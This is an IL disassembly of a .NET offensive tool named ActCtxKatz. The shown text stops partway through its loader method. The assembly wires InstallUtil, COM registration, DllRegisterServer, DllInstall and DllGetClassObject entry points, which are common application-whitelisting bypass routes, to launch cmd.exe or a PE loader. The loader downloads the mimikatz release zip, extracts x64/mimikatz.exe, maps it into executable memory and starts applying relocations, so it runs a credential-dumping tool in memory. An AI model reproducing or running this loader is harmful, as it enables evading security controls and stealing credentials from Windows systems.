
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.8.4084.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v4.0.30319
.module extern user32.dll
.module extern kernel32
.module extern kernel32.dll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System.Configuration.Install
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 4:0:0:0
}
.assembly extern System.EnterpriseServices
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 4:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System.IO.Compression
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly ActCtxKatz
{
  .custom instance void [System.EnterpriseServices]System.EnterpriseServices.ApplicationAccessControlAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [System.EnterpriseServices]System.EnterpriseServices.ApplicationActivationAttribute::.ctor(valuetype [System.EnterpriseServices]System.EnterpriseServices.ActivationOption) = ( 01 00 01 00 00 00 00 00 ) 
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module ActCtxKatz.dll
// MVID: {A6A4B2D1-41C8-4EE0-BE45-FE22F737B04A}
.imagebase 0x10000000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0003       // WINDOWS_CUI
.corflags 0x00000001    //  ILONLY
// Image base: 0x04C60000


// =============== CLASS MEMBERS DECLARATION ===================

.class public auto ansi beforefieldinit Program
       extends [mscorlib]System.Object
{
  .method public hidebysig static void  Main() cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldstr      "Hello From Main...I Don't Do Anything"
    IL_0006:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_000b:  nop
    IL_000c:  ret
  } // end of method Program::Main

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Program::.ctor

} // end of class Program

.class public auto ansi beforefieldinit Thing0
       extends [mscorlib]System.Object
{
  .method public hidebysig static void  ExecParam(string a) cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process V_0)
    IL_0000:  nop
    IL_0001:  ldstr      "cmd.exe"
    IL_0006:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
    IL_000b:  stloc.0
    IL_000c:  ldloc.0
    IL_000d:  callvirt   instance native int [System]System.Diagnostics.Process::get_MainWindowHandle()
    IL_0012:  ldarg.0
    IL_0013:  call       int32 Thing0::SetWindowText(native int,
                                                     string)
    IL_0018:  pop
    IL_0019:  ret
  } // end of method Thing0::ExecParam

  .method private hidebysig static pinvokeimpl("user32.dll" winapi) 
          int32  SetWindowText(native int hWnd,
                               string text) cil managed preservesig
  {
  }
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Thing0::.ctor

} // end of class Thing0

.class public auto ansi beforefieldinit Things
       extends [System.Configuration.Install]System.Configuration.Install.Installer
{
  .custom instance void [System]System.ComponentModel.RunInstallerAttribute::.ctor(bool) = ( 01 00 01 00 00 ) 
  .method public hidebysig virtual instance void 
          Uninstall(class [mscorlib]System.Collections.IDictionary savedState) cil managed
  {
    // Code size       24 (0x18)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldstr      "Hello There From Uninstall"
    IL_0006:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_000b:  nop
    IL_000c:  ldstr      "InstallUtil Uninstall"
    IL_0011:  call       void Thing0::ExecParam(string)
    IL_0016:  nop
    IL_0017:  ret
  } // end of method Things::Uninstall

  .method public hidebysig specialname virtual 
          instance string  get_HelpText() cil managed
  {
    // Code size       22 (0x16)
    .maxstack  1
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  ldstr      "InstallUtil Uninstall"
    IL_0006:  call       void Thing0::ExecParam(string)
    IL_000b:  nop
    IL_000c:  ldstr      "Executed: HelpText property\n"
    IL_0011:  stloc.0
    IL_0012:  br.s       IL_0014

    IL_0014:  ldloc.0
    IL_0015:  ret
  } // end of method Things::get_HelpText

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Configuration.Install]System.Configuration.Install.Installer::.ctor()
    IL_0006:  ret
  } // end of method Things::.ctor

  .property instance string HelpText()
  {
    .get instance string Things::get_HelpText()
  } // end of property Things::HelpText
} // end of class Things

.class public auto ansi beforefieldinit Bypass
       extends [System.EnterpriseServices]System.EnterpriseServices.ServicedComponent
{
  .custom instance void [System.EnterpriseServices]System.EnterpriseServices.TransactionAttribute::.ctor(valuetype [System.EnterpriseServices]System.EnterpriseServices.TransactionOption) = ( 01 00 03 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 33 31 44 32 42 39 36 39 2D 37 36 30 38   // ..$31D2B969-7608
                                                                                                  2D 34 32 36 45 2D 39 44 38 45 2D 41 30 39 46 43   // -426E-9D8E-A09FC
                                                                                                  39 41 35 31 36 38 30 00 00 )                      // 9A51680..
  .custom instance void [mscorlib]System.Runtime.InteropServices.ClassInterfaceAttribute::.ctor(valuetype [mscorlib]System.Runtime.InteropServices.ClassInterfaceType) = ( 01 00 00 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ProgIdAttribute::.ctor(string) = ( 01 00 0F 64 6C 6C 67 75 65 73 74 2E 42 79 70 61   // ...dllguest.Bypa
                                                                                                    73 73 00 00 )                                     // ss..
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 01 00 00 ) 
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       21 (0x15)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.EnterpriseServices]System.EnterpriseServices.ServicedComponent::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ldstr      "I am a basic COM Object"
    IL_000d:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0012:  nop
    IL_0013:  nop
    IL_0014:  ret
  } // end of method Bypass::.ctor

  .method public hidebysig static void  RegisterClass(string key) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComRegisterFunctionAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       24 (0x18)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldstr      "I shouldn't really execute"
    IL_0006:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_000b:  nop
    IL_000c:  ldstr      "COM UnRegisterClass"
    IL_0011:  call       void Thing0::ExecParam(string)
    IL_0016:  nop
    IL_0017:  ret
  } // end of method Bypass::RegisterClass

  .method public hidebysig static void  UnRegisterClass(string key) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComUnregisterFunctionAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       24 (0x18)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldstr      "I shouldn't really execute either."
    IL_0006:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_000b:  nop
    IL_000c:  ldstr      "COM UnRegisterClass"
    IL_0011:  call       void Thing0::ExecParam(string)
    IL_0016:  nop
    IL_0017:  ret
  } // end of method Bypass::UnRegisterClass

  .method public hidebysig instance void 
          Exec() cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldstr      "COM Public Exec"
    IL_0006:  call       void Thing0::ExecParam(string)
    IL_000b:  nop
    IL_000c:  ret
  } // end of method Bypass::Exec

} // end of class Bypass

.class private auto ansi beforefieldinit Exports
       extends [mscorlib]System.Object
{
  .method public hidebysig static void  EntryPoint(native int hwnd,
                                                   native int hinst,
                                                   string lpszCmdLine,
                                                   int32 nCmdShow) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldstr      "EntryPoint"
    IL_0006:  call       void Thing0::ExecParam(string)
    IL_000b:  nop
    IL_000c:  ret
  } // end of method Exports::EntryPoint

  .method public hidebysig static bool  DllRegisterServer() cil managed
  {
    // Code size       18 (0x12)
    .maxstack  1
    .locals init (bool V_0)
    IL_0000:  nop
    IL_0001:  ldstr      "DllRegisterServer"
    IL_0006:  call       void Thing0::ExecParam(string)
    IL_000b:  nop
    IL_000c:  ldc.i4.1
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method Exports::DllRegisterServer

  .method public hidebysig static bool  DllUnregisterServer() cil managed
  {
    // Code size       18 (0x12)
    .maxstack  1
    .locals init (bool V_0)
    IL_0000:  nop
    IL_0001:  ldstr      "DllUnregisterServer"
    IL_0006:  call       void Thing0::ExecParam(string)
    IL_000b:  nop
    IL_000c:  ldc.i4.1
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method Exports::DllUnregisterServer

  .method public hidebysig static void  DllInstall(bool bInstall,
                                                   native int a) cil managed
  {
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  ldarg.1
    IL_0002:  call       string [mscorlib]System.Runtime.InteropServices.Marshal::PtrToStringUni(native int)
    IL_0007:  stloc.0
    IL_0008:  ldloc.0
    IL_0009:  call       void Thing0::ExecParam(string)
    IL_000e:  nop
    IL_000f:  ret
  } // end of method Exports::DllInstall

  .method public hidebysig static int32  DllGetClassObject(native int rclsid,
                                                           native int riid,
                                                           native int& ppvObj) cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  1
	.export[0]
    .locals init (string V_0,
             int32 V_1)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       string [mscorlib]System.Runtime.InteropServices.Marshal::PtrToStringUni(native int)
    IL_0007:  stloc.0
    IL_0008:  ldstr      "Hell Yeah! Boomer!"
    IL_000d:  call       valuetype [System.Windows.Forms]System.Windows.Forms.DialogResult [System.Windows.Forms]System.Windows.Forms.MessageBox::Show(string)
    IL_0012:  pop
    IL_0013:  call       void PELoader.Program::Main()
    IL_0018:  nop
    IL_0019:  ldc.i4.0
    IL_001a:  stloc.1
    IL_001b:  br.s       IL_001d

    IL_001d:  ldloc.1
    IL_001e:  ret
  } // end of method Exports::DllGetClassObject

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Exports::.ctor

} // end of class Exports

.class public auto ansi beforefieldinit PELoader.Sample
       extends [System.Configuration.Install]System.Configuration.Install.Installer
{
  .custom instance void [System]System.ComponentModel.RunInstallerAttribute::.ctor(bool) = ( 01 00 01 00 00 ) 
  .method public hidebysig virtual instance void 
          Uninstall(class [mscorlib]System.Collections.IDictionary savedState) cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  call       void PELoader.Program::Main()
    IL_0006:  nop
    IL_0007:  ret
  } // end of method Sample::Uninstall

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Configuration.Install]System.Configuration.Install.Installer::.ctor()
    IL_0006:  ret
  } // end of method Sample::.ctor

} // end of class PELoader.Sample

.class private auto ansi beforefieldinit PELoader.Program
       extends [mscorlib]System.Object
{
  .method public hidebysig static uint8[] 
          ReadFully(class [mscorlib]System.IO.Stream input) cil managed
  {
    // Code size       85 (0x55)
    .maxstack  4
    .locals init (uint8[] V_0,
             class [mscorlib]System.IO.MemoryStream V_1,
             int32 V_2,
             uint8[] V_3,
             bool V_4)
    IL_0000:  nop
    IL_0001:  ldc.i4     0x4000
    IL_0006:  newarr     [mscorlib]System.Byte
    IL_000b:  stloc.0
    IL_000c:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0011:  stloc.1
    .try
    {
      IL_0012:  nop
      IL_0013:  br.s       IL_0021

      IL_0015:  nop
      IL_0016:  ldloc.1
      IL_0017:  ldloc.0
      IL_0018:  ldc.i4.0
      IL_0019:  ldloc.2
      IL_001a:  callvirt   instance void [mscorlib]System.IO.Stream::Write(uint8[],
                                                                           int32,
                                                                           int32)
      IL_001f:  nop
      IL_0020:  nop
      IL_0021:  ldarg.0
      IL_0022:  ldloc.0
      IL_0023:  ldc.i4.0
      IL_0024:  ldloc.0
      IL_0025:  ldlen
      IL_0026:  conv.i4
      IL_0027:  callvirt   instance int32 [mscorlib]System.IO.Stream::Read(uint8[],
                                                                           int32,
                                                                           int32)
      IL_002c:  dup
      IL_002d:  stloc.2
      IL_002e:  ldc.i4.0
      IL_002f:  cgt
      IL_0031:  stloc.s    V_4
      IL_0033:  ldloc.s    V_4
      IL_0035:  brtrue.s   IL_0015

      IL_0037:  ldloc.1
      IL_0038:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_003d:  stloc.3
      IL_003e:  leave.s    IL_0052

    }  // end .try
    finally
    {
      IL_0040:  ldloc.1
      IL_0041:  ldnull
      IL_0042:  ceq
      IL_0044:  stloc.s    V_4
      IL_0046:  ldloc.s    V_4
      IL_0048:  brtrue.s   IL_0051

      IL_004a:  ldloc.1
      IL_004b:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0050:  nop
      IL_0051:  endfinally
    }  // end handler
    IL_0052:  nop
    IL_0053:  ldloc.3
    IL_0054:  ret
  } // end of method Program::ReadFully

  .method public hidebysig static void  Main() cil managed
  {
    // Code size       1422 (0x58e)
    .maxstack  6
    .locals init (class [System]System.Net.WebClient V_0,
             uint8[] V_1,
             uint8[] V_2,
             class [mscorlib]System.IO.Stream V_3,
             class [mscorlib]System.IO.Stream V_4,
             class [System.IO.Compression]System.IO.Compression.ZipArchive V_5,
             class [System.IO.Compression]System.IO.Compression.ZipArchiveEntry V_6,
             class [mscorlib]System.Exception V_7,
             class PELoader.PELoader V_8,
             native int V_9,
             int32 V_10,
             native int V_11,
             int64 V_12,
             int64 V_13,
             native int V_14,
             valuetype PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION V_15,
             int32 V_16,
             native int V_17,
             int32 V_18,
             native int V_19,
             valuetype PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION V_20,
             native int V_21,
             native int V_22,
             native int V_23,
             uint16 V_24,
             uint16 V_25,
             uint16 V_26,
             int64 V_27,
             native int V_28,
             native int V_29,
             int32 V_30,
             int32 V_31,
             native int V_32,
             int32 V_33,
             native int V_34,
             native int V_35,
             string V_36,
             native int V_37,
             int32 V_38,
             native int V_39,
             string V_40,
             native int V_41,
             native int V_42,
             native int V_43,
             class [mscorlib]System.Collections.Generic.IEnumerator`1<class [System.IO.Compression]System.IO.Compression.ZipArchiveEntry> V_44,
             bool V_45,
             uint64 V_46,
             uint32 V_47,
             uint16 V_48)
    IL_0000:  nop
    IL_0001:  newobj     instance void [System]System.Net.WebClient::.ctor()
    IL_0006:  stloc.0
    IL_0007:  ldnull
    IL_0008:  stloc.1
    .try
    {
      IL_0009:  nop
      IL_000a:  ldloc.0
      IL_000b:  ldstr      "https://github.com/gentilkiwi/mimikatz/releases/do"
      + "wnload/2.2.0-20210810-2/mimikatz_trunk.zip"
      IL_0010:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
      IL_0015:  stloc.2
      IL_0016:  ldloc.2
      IL_0017:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
      IL_001c:  stloc.3
      IL_001d:  ldloc.3
      IL_001e:  newobj     instance void [System.IO.Compression]System.IO.Compression.ZipArchive::.ctor(class [mscorlib]System.IO.Stream)
      IL_0023:  stloc.s    V_5
      IL_0025:  nop
      IL_0026:  ldloc.s    V_5
      IL_0028:  callvirt   instance class [mscorlib]System.Collections.ObjectModel.ReadOnlyCollection`1<class [System.IO.Compression]System.IO.Compression.ZipArchiveEntry> [System.IO.Compression]System.IO.Compression.ZipArchive::get_Entries()
      IL_002d:  callvirt   instance class [mscorlib]System.Collections.Generic.IEnumerator`1<!0> class [mscorlib]System.Collections.ObjectModel.ReadOnlyCollection`1<class [System.IO.Compression]System.IO.Compression.ZipArchiveEntry>::GetEnumerator()
      IL_0032:  stloc.s    V_44
      .try
      {
        IL_0034:  br.s       IL_007b

        IL_0036:  ldloc.s    V_44
        IL_0038:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.IEnumerator`1<class [System.IO.Compression]System.IO.Compression.ZipArchiveEntry>::get_Current()
        IL_003d:  stloc.s    V_6
        IL_003f:  nop
        IL_0040:  ldloc.s    V_6
        IL_0042:  callvirt   instance string [System.IO.Compression]System.IO.Compression.ZipArchiveEntry::get_FullName()
        IL_0047:  ldstr      "x64/mimikatz.exe"
        IL_004c:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                       string)
        IL_0051:  ldc.i4.0
        IL_0052:  ceq
        IL_0054:  stloc.s    V_45
        IL_0056:  ldloc.s    V_45
        IL_0058:  brtrue.s   IL_007a

        IL_005a:  nop
        IL_005b:  ldloc.s    V_6
        IL_005d:  callvirt   instance string [System.IO.Compression]System.IO.Compression.ZipArchiveEntry::get_FullName()
        IL_0062:  call       void [mscorlib]System.Console::WriteLine(string)
        IL_0067:  nop
        IL_0068:  ldloc.s    V_6
        IL_006a:  callvirt   instance class [mscorlib]System.IO.Stream [System.IO.Compression]System.IO.Compression.ZipArchiveEntry::Open()
        IL_006f:  stloc.s    V_4
        IL_0071:  ldloc.s    V_4
        IL_0073:  call       uint8[] PELoader.Program::ReadFully(class [mscorlib]System.IO.Stream)
        IL_0078:  stloc.1
        IL_0079:  nop
        IL_007a:  nop
        IL_007b:  ldloc.s    V_44
        IL_007d:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
        IL_0082:  stloc.s    V_45
        IL_0084:  ldloc.s    V_45
        IL_0086:  brtrue.s   IL_0036

        IL_0088:  leave.s    IL_009e

      }  // end .try
      finally
      {
        IL_008a:  ldloc.s    V_44
        IL_008c:  ldnull
        IL_008d:  ceq
        IL_008f:  stloc.s    V_45
        IL_0091:  ldloc.s    V_45
        IL_0093:  brtrue.s   IL_009d

        IL_0095:  ldloc.s    V_44
        IL_0097:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_009c:  nop
        IL_009d:  endfinally
      }  // end handler
      IL_009e:  nop
      IL_009f:  nop
      IL_00a0:  leave.s    IL_00d0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a2:  stloc.s    V_7
      IL_00a4:  nop
      IL_00a5:  br.s       IL_00bf

      IL_00a7:  nop
      IL_00a8:  ldloc.s    V_7
      IL_00aa:  callvirt   instance string [mscorlib]System.Exception::get_Message()
      IL_00af:  call       void [mscorlib]System.Console::WriteLine(string)
      IL_00b4:  nop
      IL_00b5:  ldloc.s    V_7
      IL_00b7:  callvirt   instance class [mscorlib]System.Exception [mscorlib]System.Exception::get_InnerException()
      IL_00bc:  stloc.s    V_7
      IL_00be:  nop
      IL_00bf:  ldloc.s    V_7
      IL_00c1:  ldnull
      IL_00c2:  ceq
      IL_00c4:  ldc.i4.0
      IL_00c5:  ceq
      IL_00c7:  stloc.s    V_45
      IL_00c9:  ldloc.s    V_45
      IL_00cb:  brtrue.s   IL_00a7

      IL_00cd:  nop
      IL_00ce:  leave.s    IL_00d0

    }  // end handler
    IL_00d0:  nop
    IL_00d1:  ldstr      "Downloaded Latest"
    IL_00d6:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_00db:  nop
    IL_00dc:  ldloc.1
    IL_00dd:  newobj     instance void PELoader.PELoader::.ctor(uint8[])
    IL_00e2:  stloc.s    V_8
    IL_00e4:  ldstr      "Preferred Load Address = {0}"
    IL_00e9:  ldloc.s    V_8
    IL_00eb:  callvirt   instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 PELoader.PELoader::get_OptionalHeader64()
    IL_00f0:  ldfld      uint64 PELoader.PELoader/IMAGE_OPTIONAL_HEADER64::ImageBase
    IL_00f5:  stloc.s    V_46
    IL_00f7:  ldloca.s   V_46
    IL_00f9:  ldstr      "X4"
    IL_00fe:  call       instance string [mscorlib]System.UInt64::ToString(string)
    IL_0103:  call       void [mscorlib]System.Console::WriteLine(string,
                                                                  object)
    IL_0108:  nop
    IL_0109:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_010e:  stloc.s    V_9
    IL_0110:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0115:  ldloc.s    V_8
    IL_0117:  callvirt   instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 PELoader.PELoader::get_OptionalHeader64()
    IL_011c:  ldfld      uint32 PELoader.PELoader/IMAGE_OPTIONAL_HEADER64::SizeOfImage
    IL_0121:  ldsfld     uint32 PELoader.NativeDeclarations::MEM_COMMIT
    IL_0126:  ldsfld     uint32 PELoader.NativeDeclarations::PAGE_EXECUTE_READWRITE
    IL_012b:  call       native int PELoader.NativeDeclarations::VirtualAlloc(native int,
                                                                              uint32,
                                                                              uint32,
                                                                              uint32)
    IL_0130:  stloc.s    V_9
    IL_0132:  ldstr      "Allocated Space For {0} at {1}"
    IL_0137:  ldloc.s    V_8
    IL_0139:  callvirt   instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 PELoader.PELoader::get_OptionalHeader64()
    IL_013e:  ldfld      uint32 PELoader.PELoader/IMAGE_OPTIONAL_HEADER64::SizeOfImage
    IL_0143:  stloc.s    V_47
    IL_0145:  ldloca.s   V_47
    IL_0147:  ldstr      "X4"
    IL_014c:  call       instance string [mscorlib]System.UInt32::ToString(string)
    IL_0151:  ldloca.s   V_9
    IL_0153:  ldstr      "X4"
    IL_0158:  call       instance string [mscorlib]System.IntPtr::ToString(string)
    IL_015d:  call       void [mscorlib]System.Console::WriteLine(string,
                                                                  object,
                                                                  object)
    IL_0162:  nop
    IL_0163:  ldc.i4.0
    IL_0164:  stloc.s    V_10
    IL_0166:  br         IL_0215

    IL_016b:  nop
    IL_016c:  ldloc.s    V_9
    IL_016e:  ldloc.s    V_8
    IL_0170:  callvirt   instance valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::get_ImageSectionHeaders()
    IL_0175:  ldloc.s    V_10
    IL_0177:  ldelema    PELoader.PELoader/IMAGE_SECTION_HEADER
    IL_017c:  ldfld      uint32 PELoader.PELoader/IMAGE_SECTION_HEADER::VirtualAddress
    IL_0181:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_0186:  ldloc.s    V_8
    IL_0188:  callvirt   instance valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::get_ImageSectionHeaders()
    IL_018d:  ldloc.s    V_10
    IL_018f:  ldelema    PELoader.PELoader/IMAGE_SECTION_HEADER
    IL_0194:  ldfld      uint32 PELoader.PELoader/IMAGE_SECTION_HEADER::SizeOfRawData
    IL_0199:  ldsfld     uint32 PELoader.NativeDeclarations::MEM_COMMIT
    IL_019e:  ldsfld     uint32 PELoader.NativeDeclarations::PAGE_EXECUTE_READWRITE
    IL_01a3:  call       native int PELoader.NativeDeclarations::VirtualAlloc(native int,
                                                                              uint32,
                                                                              uint32,
                                                                              uint32)
    IL_01a8:  stloc.s    V_11
    IL_01aa:  ldloc.s    V_8
    IL_01ac:  callvirt   instance uint8[] PELoader.PELoader::get_RawBytes()
    IL_01b1:  ldloc.s    V_8
    IL_01b3:  callvirt   instance valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::get_ImageSectionHeaders()
    IL_01b8:  ldloc.s    V_10
    IL_01ba:  ldelema    PELoader.PELoader/IMAGE_SECTION_HEADER
    IL_01bf:  ldfld      uint32 PELoader.PELoader/IMAGE_SECTION_HEADER::PointerToRawData
    IL_01c4:  ldloc.s    V_11
    IL_01c6:  ldloc.s    V_8
    IL_01c8:  callvirt   instance valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::get_ImageSectionHeaders()
    IL_01cd:  ldloc.s    V_10
    IL_01cf:  ldelema    PELoader.PELoader/IMAGE_SECTION_HEADER
    IL_01d4:  ldfld      uint32 PELoader.PELoader/IMAGE_SECTION_HEADER::SizeOfRawData
    IL_01d9:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::Copy(uint8[],
                                                                                     int32,
                                                                                     native int,
                                                                                     int32)
    IL_01de:  nop
    IL_01df:  ldstr      "Section {0}, Copied To {1}"
    IL_01e4:  ldloc.s    V_8
    IL_01e6:  callvirt   instance valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::get_ImageSectionHeaders()
    IL_01eb:  ldloc.s    V_10
    IL_01ed:  ldelema    PELoader.PELoader/IMAGE_SECTION_HEADER
    IL_01f2:  ldfld      char[] PELoader.PELoader/IMAGE_SECTION_HEADER::Name
    IL_01f7:  newobj     instance void [mscorlib]System.String::.ctor(char[])
    IL_01fc:  ldloca.s   V_11
    IL_01fe:  ldstr      "X4"
    IL_0203:  call       instance string [mscorlib]System.IntPtr::ToString(string)
    IL_0208:  call       void [mscorlib]System.Console::WriteLine(string,
                                                                  object,
                                                                  object)
    IL_020d:  nop
    IL_020e:  nop
    IL_020f:  ldloc.s    V_10
    IL_0211:  ldc.i4.1
    IL_0212:  add
    IL_0213:  stloc.s    V_10
    IL_0215:  ldloc.s    V_10
    IL_0217:  ldloc.s    V_8
    IL_0219:  callvirt   instance valuetype PELoader.PELoader/IMAGE_FILE_HEADER PELoader.PELoader::get_FileHeader()
    IL_021e:  ldfld      uint16 PELoader.PELoader/IMAGE_FILE_HEADER::NumberOfSections
    IL_0223:  clt
    IL_0225:  stloc.s    V_45
    IL_0227:  ldloc.s    V_45
    IL_0229:  brtrue     IL_016b

    IL_022e:  ldloca.s   V_9
    IL_0230:  call       instance int64 [mscorlib]System.IntPtr::ToInt64()
    IL_0235:  stloc.s    V_12
    IL_0237:  ldloc.s    V_12
    IL_0239:  ldloc.s    V_8
    IL_023b:  callvirt   instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 PELoader.PELoader::get_OptionalHeader64()
    IL_0240:  ldfld      uint64 PELoader.PELoader/IMAGE_OPTIONAL_HEADER64::ImageBase
    IL_0245:  sub
    IL_0246:  stloc.s    V_13
    IL_0248:  ldstr      "Delta = {0}"
    IL_024d:  ldloca.s   V_13
    IL_024f:  ldstr      "X4"
    IL_0254:  call       instance string [mscorlib]System.Int64::ToString(string)
    IL_0259:  call       void [mscorlib]System.Console::WriteLine(string,
                                                                  object)
    IL_025e:  nop
    IL_025f:  ldloc.s    V_9
    IL_0261:  ldloc.s    V_8
    IL_0263:  callvirt   instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 PELoader.PELoader::get_OptionalHeader64()
    IL_0268:  ldfld      valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY PELoader.PELoader/IMAGE_OPTIONAL_HEADER64::BaseRelocationTable
    IL_026d:  ldfld      uint32 PELoader.PELoader/IMAGE_DATA_DIRECTORY::VirtualAddress
    IL_0272:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_0277:  stloc.s    V_14
    IL_0279:  ldloca.s   V_15
    IL_027b:  initobj    PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION
    IL_0281:  ldloc.s    V_14
    IL_0283:  ldtoken    PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION
    IL_0288:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_028d:  call       object [mscorlib]System.Runtime.InteropServices.Marshal::PtrToStructure(native int,
                                                                                                 class [mscorlib]System.Type)
    IL_0292:  unbox.any  PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION
    IL_0297:  stloc.s    V_15
    IL_0299:  ldtoken    PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION
    IL_029e:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_02a3:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
    IL_02a8:  stloc.s    V_16
